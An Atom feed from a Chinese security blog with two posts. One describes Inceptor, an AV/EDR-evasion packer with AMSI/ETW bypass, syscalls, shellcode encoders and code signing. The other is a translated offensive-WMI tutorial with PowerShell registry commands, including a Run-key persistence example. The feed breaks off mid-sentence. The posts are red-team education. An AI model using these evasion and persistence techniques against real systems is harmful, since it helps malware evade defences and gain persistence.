<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zeronohacker</title>
  
  <subtitle>零度非安全</subtitle>
  <link href="https://zeronohacker.github.io/atom.xml" rel="self"/>
  
  <link href="https://zeronohacker.github.io/"/>
  <updated>2021-09-22T09:14:40.146Z</updated>
  <id>https://zeronohacker.github.io/</id>
  
  <author>
    <name>zeronohacker</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>以模板驱动的逃避 AV/EDR 框架</title>
    <link href="https://zeronohacker.github.io/2021/09/21/template-driven-av-and-edr-evasion-framework/"/>
    <id>https://zeronohacker.github.io/2021/09/21/template-driven-av-and-edr-evasion-framework/</id>
    <published>2021-09-21T09:44:22.000Z</published>
    <updated>2021-09-22T09:14:40.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>渗透测试和红队需要绕过常见的 AV/EDR 设备并在目标上执行代码，随着时间的推移，防御会越来越强，绕过也会变得越来越困难。Inceptor 是一个自动化 (绕过 AV/EDR) 工具，不需要你做额外的准备。</p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/klezVirus/inceptor"><img src="https://github-readme-stats.vercel.app/api/pin/?username=klezVirus&repo=inceptor&theme=blue-green&show_owner=true"/></a><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>Inceptor 是一个基于模板的 Windows PE packer，旨在为渗透测试人员和红队人员提供绕过常见的 AV/EDR 方案。当时设计 Inceptor 这款工具的重点是要有可用性，并允许用户自定义。</p><p>如果想全面了解，以下资源可能会对你有所帮助：</p><ul><li><a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/CodeExeNewDotNet/">The path to code execution in the era of EDR, Next-Gen AVs, and AMSI</a></li><li><a href="https://github.com/klezVirus/inceptor/blob/main/slides/Inceptor - Bypass AV-EDR solutions combining well known techniques.pdf">Inceptor - Bypass AV-EDR solutions combining well known techniques</a></li></ul><h3 id="ShellCode-转换和加载"><a href="#ShellCode-转换和加载" class="headerlink" title="ShellCode 转换和加载"></a>ShellCode 转换和加载</h3><p>Inceptor 能够使用各种开源转换器将现有的 EXE/DLL 转换为 ShellCode：</p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/TheWover/donut"><img src="https://github-readme-stats.vercel.app/api/pin/?username=TheWover&repo=donut&theme=merko&show_owner=true"/></a><p>donut 由 <a href="https://twitter.com/TheRealWover">TheWover</a> 创建，可将 Native、DLL 和 .Net 二进制文件转换为单独的一块 ShellCode</p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/monoxgas/sRDI"><img src="https://github-readme-stats.vercel.app/api/pin/?username=monoxgas&repo=sRDI&theme=monokai&show_owner=true"/></a><p>sRDIr 由 <a href="https://twitter.com/monoxgas">Monoxgas</a> 创建，可将现有的 naticcve DLL 转换为 PIC，然后将其作为常规的 ShellCode 注入</p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/hasherezade/pe_to_shellcode"><img src="https://github-readme-stats.vercel.app/api/pin/?username=hasherezade&repo=pe_to_shellcode&theme=shades-of-purple&show_owner=true"/></a><p>pe_to_shellcode 由 <a href="https://twitter.com/hasherezade">Hasherazade</a> 创建，可将原生的 EXE 转换为 PIC ShellCode，也可以作为普通的 EXE 运行</p><h3 id="LI-编码器-vs-LD-编码器"><a href="#LI-编码器-vs-LD-编码器" class="headerlink" title="LI 编码器  vs LD 编码器"></a>LI 编码器  vs LD 编码器</h3><p>Inceptor 可以使用不同的方式对 ShellCode 进行编码、压缩或加密。在开发该工具时，分两种，一种为 loader-independent (LI) 编码，另一种为 loader-dependent (LD) 编码。</p><p>LI 编码是一种不受使用者 (loader) 选择的模板管理的编码，通常这意味着解码 Stub 不是模板的一部分，而是被嵌入的 ShellCode 本身。Inceptor 使用开源工具 sgn (使 Payload 具有多态性，通用签名无法检测到) 让自身具有此项特性。</p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/EgeBalci/sgn"><img src="https://github-readme-stats.vercel.app/api/pin/?username=EgeBalci&repo=sgn&theme=blue-green&show_owner=true"/></a><p>Shikata-Ga-Nai 并不真正适合某些模板，即便它很强大。出于这个原因，Inceptor 还实现了 Loader-dependent 的编码器，这些编码器旨在让加载器负责解码。因此，LD 编码器直接在模板中安装解码 Stub。 这种在 Inceptor 中实现的编码器也是 “可组合的”，这意味着它们可以组合在一起以对 Payload 进行编码。</p><p>虽然使用一系列编码器有时可以改善给定 Payload 的混淆，但这种技术也 “透明”，反而可帮助防御者更好地提出相关特征数据。出于这个原因，Inceptor 提供了多种方法来混淆最终工件，强化 RE 过程。</p><p>在撰写本文时，Inceptor 的公共版本已提供以下编码器/压缩器/加密器：</p><ul><li>Native<ul><li>Xor</li><li>Nop (Insertion)</li></ul></li><li>.NET<ul><li>Hex</li><li>Base64</li><li>Xor</li><li>Nop (Insertion)</li><li>AES</li><li>Zlib</li><li>RLE</li></ul></li><li>PowerShell<ul><li>Hex</li><li>Base64</li><li>Xor</li><li>Nop (Insertion)</li><li>AES</li></ul></li></ul><p>Inceptor 可以静态和动态验证一系列编码，静态检查解码器的输入/输出类型，动态验证 independent implementation 的实现，用户可以使用 <code>chain-validate.py</code> 轻松验证。</p><h3 id="逃避-AV-机制"><a href="#逃避-AV-机制" class="headerlink" title="逃避 AV 机制"></a>逃避 AV 机制</h3><p>Inceptor 本地实现了逃避 AV 机制，因此，它提供了以 “模块” (插件) 的形式将逃避 AV 功能包含到 Payload 中。</p><p>可以嵌入的插件有：</p><div class='checkbox red checked'><input type="checkbox" checked="checked"/>            <p>AMSI bypass</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>WLDP bypass</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>ETW bypass</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>Sandbox (Behavioural) Deception</p>            </div><h3 id="逃避-EDR-机制"><a href="#逃避-EDR-机制" class="headerlink" title="逃避 EDR 机制"></a>逃避 EDR 机制</h3><p>Inceptor 还实现了逃避 EDR 机制，例如 full unhooking、direct syscall 和 manual DLL Mapping。direct syscall 是在 C# 中使用优秀的 DInvoke 项目实现的，也是由 TheWover 实现的。在 C/C++ 中，Syscalls 由 <a href="https://twitter.com/Jackson_T">Jackson_T</a> 使用 SysWhispers  和 SysWhispers2 项目实现。此外，Inceptor 还内置了对 x86 Syscalls 的支持。</p><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/TheWover/DInvoke"><img src="https://github-readme-stats.vercel.app/api/pin/?username=TheWover&repo=DInvoke&theme=react&show_owner=true"/></a></td><td style="text-align:center"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/phra/PEzor"><img src="https://github-readme-stats.vercel.app/api/pin/?username=phra&repo=PEzor&theme=react&show_owner=true"/></a></td></tr><tr><td style="text-align:center"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/jthuraisamy/SysWhispers"><img src="https://github-readme-stats.vercel.app/api/pin/?username=jthuraisamy&repo=SysWhispers&theme=ocean_dark&show_owner=true"/></a></td><td style="text-align:center"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/jthuraisamy/SysWhispers2"><img src="https://github-readme-stats.vercel.app/api/pin/?username=jthuraisamy&repo=SysWhispers2&theme=ocean_dark&show_owner=true"/></a></td></tr></tbody></table></div><p>AV bypass 功能可以作为模块启用，唯一的区别是它们需要在支持它们的模板上运行。目前实现的技术有：</p><div class='checkbox red checked'><input type="checkbox" checked="checked"/>            <p>Full Unhooking</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>Manual DLL Mapping</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>Direct Syscalls</p>            </div><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>Inceptor 支持使用外部工具 (例如 ConfuserEx、Chameleon 和 LLVM-Obfuscator，LLVM-Obfuscator 是基于 IR 的混淆器) 对 Payload 进行混淆。</p><div class='checkbox red checked'><input type="checkbox" checked="checked"/>            <p>PowerShell</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>C#</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>C/C++</p>            </div><h3 id="代码签名"><a href="#代码签名" class="headerlink" title="代码签名"></a>代码签名</h3><p>Inceptor 的另一个特点是可以使用 CarbonCopy 工具对生成的二进制文件进行代码签名。通常，对使用代码签名证书签名的文件的分析都不太严格，许多反恶意软件产品不验证/验证这些证书。</p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/paranoidninja/CarbonCopy"><img src="https://github-readme-stats.vercel.app/api/pin/?username=paranoidninja&repo=CarbonCopy&theme=react&show_owner=true"/></a><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>以下图概括了完整的工作流程：</p><p><img src="https://image.zeronohacker.com/article/2021/09/21/workflow.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Inceptor 被设计在 Windows 下工作，<code>update-config.py</code> 可以找到所需的二进制文件并相应地更新配置，可能需要安装 Microsoft Build Tools、Windows SDK 和 Visual Studio，<code>update-config.py</code> 将指导用户如何安装所需的依赖项。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/klezVirus/inceptor.git</span><br><span class="line">cd inceptor</span><br><span class="line">virtualenv venv</span><br><span class="line">venv\Scripts\activate.bat</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">cd inceptor</span><br><span class="line">python update-config.py</span><br></pre></td></tr></table></figure><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h3 id="默认加载器"><a href="#默认加载器" class="headerlink" title="默认加载器"></a>默认加载器</h3><p>当前版本的 Inceptor 使用简单的命名约定 (不要更改模板名称) 和用户提供的参数集来定位特定模板。在参数中，还有加载器 (-t) 参数。如果未指定，则用默认：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python inceptor.py -hh</span></span><br><span class="line"></span><br><span class="line">[*] Default Loaders</span><br><span class="line">      Input File Extension SpecialCondition   Guessed Filetype Default Loader  Default Template</span><br><span class="line">0                     .raw              NaN          Shellcode  Simple Loader           Classic</span><br><span class="line">1                     .exe             .NET  Dotnet Executable          Donut           Classic</span><br><span class="line">2                     .exe              NaN  Native Executable   Pe2Shellcode           PE Load</span><br><span class="line">3                     .dll              NaN     Native Library           sRDI           Classic</span><br></pre></td></tr></table></figure><h3 id="模板命名约定"><a href="#模板命名约定" class="headerlink" title="模板命名约定"></a>模板命名约定</h3><p>理解模板名称约定也非常重要，以免误解工件行为。</p><ul><li>Classic：经典模板通常意味着它使用 VirtualAlloc/VirtualAllocEx 和 CreateThread/CreateRemoteThreadAPI 来分配和执行任意代码</li><li>Dinvoke：如果模板仅包含 dinvoke (例如 classic-dinvoke.cs)，则表示它使用 dinvoke 的动态函数解析功能</li><li>Dinvoke-subtechnique：包含 dinvoke 的模板及使用 dinvoke 的特定功能，如 manual_mapping、overload_mapping 或 Syscalls</li><li>Syscalls：顾名思义，此模板使用 Syscalls</li><li>PE Load：此模板尝试将完整 PE 映射到内存中，而不进行转换</li><li>Assembly Load：此模板尝试使用反射执行 .NET 程序集</li></ul><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> usage: inceptor.py [-h] [-hh] [-Z] &#123;native,dotnet,powershell&#125; ...</span></span><br><span class="line"></span><br><span class="line">inceptor: A Windows-based PE Packing framework designed to help </span><br><span class="line">          Red Team Operators to bypass common AV and EDR solutions</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  &#123;native,dotnet,powershell&#125;</span><br><span class="line">    native              Native Binaries Generator</span><br><span class="line">    dotnet              .NET Binaries Generator</span><br><span class="line">    powershell          PowerShell Wrapper Scripts Generator</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -hh                   Show functional table</span><br><span class="line">  -Z, --check           Check file against ThreatCheck</span><br></pre></td></tr></table></figure><h2 id="下一步发展"><a href="#下一步发展" class="headerlink" title="下一步发展"></a>下一步发展</h2><ol><li>新的模板引擎</li><li>新的模板</li><li>新的编码</li><li>C# 代码混淆</li></ol><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ol><li><a href="https://github.com/klezVirus/inceptor/blob/main/slides/Inceptor - Bypass AV-EDR solutions combining well known techniques.pdf">Inceptor - Bypass AV-EDR solutions combining well known techniques</a></li><li><a href="https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods">A tale of EDR bypass methods</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;渗透测试和红队需要绕过常见的 AV/EDR 设备并在目标上执行代码，随着时间的推移，防御会越来越强，绕过也会变得越来越困难。Inceptor</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="AV" scheme="https://zeronohacker.github.io/tags/AV/"/>
    
    <category term="EDR" scheme="https://zeronohacker.github.io/tags/EDR/"/>
    
    <category term="Bypass" scheme="https://zeronohacker.github.io/tags/Bypass/"/>
    
    <category term="Template" scheme="https://zeronohacker.github.io/tags/Template/"/>
    
    <category term="Evasion" scheme="https://zeronohacker.github.io/tags/Evasion/"/>
    
  </entry>
  
  <entry>
    <title>WMI 攻击手法研究 - 与 Windows 注册表交互 (第三部分)</title>
    <link href="https://zeronohacker.github.io/2021/09/13/wmi-registry-part-3/"/>
    <id>https://zeronohacker.github.io/2021/09/13/wmi-registry-part-3/</id>
    <published>2021-09-13T14:46:41.000Z</published>
    <updated>2021-09-20T14:54:22.628Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自：<a href="https://0xinfection.github.io/posts/wmi-registry-part-3/">Offensive WMI - Interacting with Windows Registry (Part 3) :: 0xInfection’s Blog — Random ramblings of an Infected Geek.</a></p></blockquote><p><img src="https://image.zeronohacker.com/article/2021/09/13/cover.png" alt=""></p><p>这是 WMI 攻击手法研究系列第三篇，本文将重点介绍与 Windows 注册表的交互。在开始之前需要了解的一件事情是：MITRE ATT&amp;CK 对查询注册表 (Query Registry) 归类于 <a href="https://attack.mitre.org/techniques/T1012/">T1012</a> 以及它的修改 (Modify Registry) 归类于 <a href="https://attack.mitre.org/techniques/T1112/">T1112</a>。</p><h2 id="Windows-注册表是什么"><a href="#Windows-注册表是什么" class="headerlink" title="Windows 注册表是什么"></a>Windows 注册表是什么</h2><p>简单来说，注册表是一个存储操作系统配置设置的数据库：内核、设备驱动程序、服务、SAM、用户界面和第三方应用程序都使用注册表，这使得注册表成为攻击者非常关注的一个点。</p><p>注册表由称为 hives 的部分组成，例如 <code>HKEY_LOCAL_MACHINE</code>、<code>HKEY_CURRENT_USER</code> 等。检查 <code>regedit.exe</code> 中的注册表后，它们的排列方式似乎与文件系统类似，每个 hive 都有许多键，键可以有多个子键，键或子键用来存储值。注册表项由名称和值组成，成一对。</p><h2 id="注册表-amp-WMI"><a href="#注册表-amp-WMI" class="headerlink" title="注册表 &amp; WMI"></a>注册表 &amp; WMI</h2><p>WMI 提供了一个名为 <code>StdRegProv</code> 的类，用于与 Windows 注册表交互。有了这个，我们可以做很多事情，包括检索、创建、删除和修改键和值。这里需要注意的重要一点是，我们需要使用 <code>root\DEFAULT</code> 命名空间来处理注册表。</p><p>让我们开始探索吧：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> StdRegProv <span class="literal">-List</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> methods</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/methods.png" alt=""></p><p>在上图中，我们可以看到一些与注册表交互的方法，比如 <code>CreateKey</code>、<code>DeleteKey</code>、<code>EnumKey</code>、<code>EnumValues</code>，<code>DeleteValues</code> 等，这很有趣。</p><p>进入之前需要了解的两件重要事情：首先，WMI 使用常量数值来标识注册表中的不同配置单元。下表列出了访问注册表配置单元的常量：</p><div class="table-container"><table><thead><tr><th>Variable</th><th>Value</th><th>Hive</th></tr></thead><tbody><tr><td>$HKCR</td><td>2147483648</td><td>HKEY_CLASSES_ROOT</td></tr><tr><td>$HKCU</td><td>2147483649</td><td>HKEY_CURRENT_USER</td></tr><tr><td>$HKLM</td><td>2147483650</td><td>HKEY_LOCAL_MACHINE</td></tr><tr><td>$HKUS</td><td>2147483651</td><td>HKEY_USERS</td></tr><tr><td>$HKCC</td><td>2147483653</td><td>HKEY_CURRENT_CONFIG</td></tr></tbody></table></div><p>其次，注册表具有不同的数据类型，并且可以使用 WMI 中的特定方法访问每种数据类型。下表将常见数据类型与它们的方法的对应关系：</p><div class="table-container"><table><thead><tr><th>Method</th><th>Data Type</th><th>Type Value</th><th>Function</th></tr></thead><tbody><tr><td><code>GetStringValue</code></td><td>REG_SZ</td><td>1</td><td>返回一个字符串</td></tr><tr><td><code>GetExpandedStringValue</code></td><td>REG_EXPAND_SZ</td><td>2</td><td>返回对 env 变量的扩展引用</td></tr><tr><td><code>GetBinaryValue</code></td><td>REG_BINARY</td><td>3</td><td>返回字节数组</td></tr><tr><td><code>GetDWORDValue</code></td><td>REG_DWORD</td><td>4</td><td>返回一个 32 位的数值</td></tr><tr><td><code>GetMultiStringValue</code></td><td>REG_MULTI_SZ</td><td>7</td><td>返回多个字符串值</td></tr><tr><td><code>GetQWORDValue</code></td><td>REG_QWORD</td><td>11</td><td>返回一个 64 位的数值</td></tr></tbody></table></div><h3 id="查询注册表"><a href="#查询注册表" class="headerlink" title="查询注册表"></a>查询注册表</h3><h4 id="枚举键"><a href="#枚举键" class="headerlink" title="枚举键"></a>枚举键</h4><p>现在我们知道了常量，让我们尝试枚举一个众所周知的注册表路径 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion</code> 下的可用子项。把我们目前所知道的放在一起，可以使用以下这个命令来获取注册表项下的所有键：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> EnumKey <span class="selector-tag">@</span>(<span class="number">2147483650</span>, <span class="string">&quot;software\microsoft\windows nt\currentversion&quot;</span>) | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> snames</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/scheduled.png" alt=""></p><p>注意：对于上层层次的注册表路径也可以这样做。如果不知道绝对路径，可以通过简单地替换上面命令中的路径来浏览注册表。例如，如果将上述命令中的路径 <code>software\microsoft\windows nt\currentversion\schedule</code> 替换为 <code>software</code>，则输出将列出 <code>HKEY_LOCAL_MACHINE\Software</code> 下的所有子项。这在探索注册表中的未知嵌套项时很有帮助。</p><h4 id="枚举值"><a href="#枚举值" class="headerlink" title="枚举值"></a>枚举值</h4><p>现在我们知道如何列出注册表项下可用的键，让我们枚举 <code>Drivers32</code> 键下的值：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> enumvalues <span class="selector-tag">@</span>(<span class="number">2147483650</span>, <span class="string">&quot;software\microsoft\windows nt\currentversion\drivers32&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/values.png" alt=""></p><p>正如我们所见，输出包含 <code>sNames</code> 下的子项名称和 <code>Types</code> 属性下的关联数据类型。当然也可以使用 Powershell 的 <code>select -ExpandProperty</code> 选项参数来扩展输出中返回的属性值。</p><h4 id="读取值"><a href="#读取值" class="headerlink" title="读取值"></a>读取值</h4><p>现在让我们尝试读取子键的值，对于示例，将读取 <code>Drivers32</code> 子键 (定义应用程序的 Windows NT DLL) 的值。过去曾观察到几个恶意软件变种使用此子键 (请参阅 <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_riern.sma">Riern Trojan Family</a>)。</p><p>以下命令读取 <code>Drivers32</code> 项下子项 <code>aux</code> 和 <code>midi</code> 的值。请注意，传递给 cmdlet 的方法名称 (通过 -Name 选项参数) 将因注册表数据类型而异 (请参阅上面的数据类型表)。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> GetStringValue <span class="selector-tag">@</span>(<span class="number">2147483650</span>, <span class="string">&quot;software\microsoft\windows nt\currentversion\drivers32&quot;</span>, <span class="string">&quot;aux&quot;</span>)</span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> GetStringValue <span class="selector-tag">@</span>(<span class="number">2147483650</span>, <span class="string">&quot;software\microsoft\windows nt\currentversion\drivers32&quot;</span>, <span class="string">&quot;midi&quot;</span>) | <span class="built_in">select</span> svalue</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/readstring.png" alt=""></p><p>提示：这是一个很好的注册表中有趣位置的 <a href="https://www.dfir.training/ultimate-registry-forensics-cheat-sheet">备忘单</a>，对攻击者很有用。</p><h3 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h3><p>现在已经知道如何使用 WMI 从注册表中读取键值对，然而，到目前为止，这些并不需要管理权限 —— 创建、删除和更新键和值可能需要提升权限。</p><p>让我们尝试创建新的键和子键，但在此之前，我们需要检查是否可以访问特定的注册表项，还有一个常量定义了对键的访问级别，下表总结了具有关联常量的权限：</p><div class="table-container"><table><thead><tr><th>Method</th><th>Value</th><th>Function</th></tr></thead><tbody><tr><td><code>KEY_QUERY_VALUE</code></td><td>1</td><td>查询注册表键的值</td></tr><tr><td><code>KEY_SET_VALUE</code></td><td>2</td><td>创建、删除或设置注册表值</td></tr><tr><td><code>KEY_CREATE_SUB_KEY</code></td><td>4</td><td>创建注册表项的子项</td></tr><tr><td><code>KEY_ENUMERATE_SUB_KEYS</code></td><td>8</td><td>枚举注册表项的子项</td></tr><tr><td><code>KEY_NOTIFY</code></td><td>16</td><td>注册表项或注册表项子项的更改通知</td></tr><tr><td><code>KEY_CREATE</code></td><td>32</td><td>创建注册表项</td></tr><tr><td><code>DELETE</code></td><td>65536</td><td>删除注册表项</td></tr><tr><td><code>READ_CONTROL</code></td><td>131072</td><td>结合 STANDARD_RIGHTS_READ、KEY_QUERY_VALUE、KEY_ENUMERATE_SUB_KEYS 和 KEY_NOTIFY 值</td></tr><tr><td><code>WRITE_DAC</code></td><td>262144</td><td>修改对象安全描述符中的 DACL</td></tr><tr><td><code>WRITE_OWNER</code></td><td>524288</td><td>更改对象安全描述符中的所有者</td></tr></tbody></table></div><h4 id="检查键的权限"><a href="#检查键的权限" class="headerlink" title="检查键的权限"></a>检查键的权限</h4><p>对于我们的示例，首先选择配置单元 <code>HKEY_CURRENT_USER</code> 下的 <code>Run</code> 键，然后选择 <code>HKEY_LOCAL_MACHINE</code>，以下展示如何做：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> CheckAccess <span class="selector-tag">@</span>(<span class="number">2147483649</span>, <span class="string">&quot;software\microsoft\windows\currentversion\run&quot;</span>, <span class="number">32</span>)</span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> CheckAccess <span class="selector-tag">@</span>(<span class="number">2147483650</span>, <span class="string">&quot;software\microsoft\windows\currentversion\run&quot;</span>, <span class="number">32</span>)</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/permissions.png" alt=""></p><p>上图中的 <code>bGranted</code> 属性告诉我们是否可以访问注册表中的特定项目。从上面的例子中，可以清楚地看到用户当前可以访问 <code>HKEY_CURRENT_USER</code> 下的 <code>Run</code> 键，而不是 <code>HKEY_LOCAL_MACHINE</code>。</p><h4 id="创建注册表项"><a href="#创建注册表项" class="headerlink" title="创建注册表项"></a>创建注册表项</h4><p>现在我们知道对在 <code>HKEY_CURRENT_USER</code> 下运行的注册表项有写访问权限，将计算器应用程序添加到注册表项中。这将导致每次系统启动时都会弹出一个计算器，这是恶意软件中常见的一种获得持久性的技术。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> SetStringValue <span class="selector-tag">@</span>(<span class="number">2147483649</span>, <span class="string">&quot;software\microsoft\windows\currentversion\run&quot;</span>, <span class="string">&quot;C:\Windows\System32\calc.exe&quot;</span>, <span class="string">&quot;Calculator&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/newsubkey.png" alt=""></p><p>Boom，我们的计算器应用程序实现了持久化。</p><p>注意：注册表项下的现有子项也可以使用上述方法进行更新。</p><h4 id="删除注册表项"><a href="#删除注册表项" class="headerlink" title="删除注册表项"></a>删除注册表项</h4><p>删除注册表子项不需要的值：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> DeleteValue <span class="selector-tag">@</span>(<span class="number">2147483649</span>, <span class="string">&quot;software\microsoft\windows\currentversion\run&quot;</span>, <span class="string">&quot;Calculator&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/deletesubkey.png" alt=""></p><h4 id="创建键"><a href="#创建键" class="headerlink" title="创建键"></a>创建键</h4><p>在少数情况下，我们可能需要在主树层次结构下创建键。假设要在 <code>HKEY_LOCAL_MACHINE\Software\OpenSSH</code> 注册表项下创建一个名为 <code>CustomAgent</code> 的新键，这个过程看起来非常简单：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> CreateKey <span class="selector-tag">@</span>(<span class="number">2147483650</span>, <span class="string">&quot;software\openssh\CustomAgent&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/newkey.png" alt=""></p><h4 id="删除键"><a href="#删除键" class="headerlink" title="删除键"></a>删除键</h4><p>删除键同样也很简单：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Namespace</span> root\default <span class="literal">-Class</span> stdregprov <span class="literal">-Name</span> DeleteKey <span class="selector-tag">@</span>(<span class="number">2147483650</span>, <span class="string">&quot;software\openssh\CustomAgent&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2021/09/13/deletekey.png" alt=""></p><h3 id="2工具"><a href="#2工具" class="headerlink" title="2工具"></a>2工具</h3><ul><li><a href="https://github.com/darkoperator/Posh-SecMod/blob/master/Registry/Registry.ps1">Registry.ps1</a>：具有易于使用的 PowerShell 函数，用于枚举、创建、删除、更新键等，在手动处理问题时非常有用；</li><li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">Get-Information.ps1</a>：Nishang 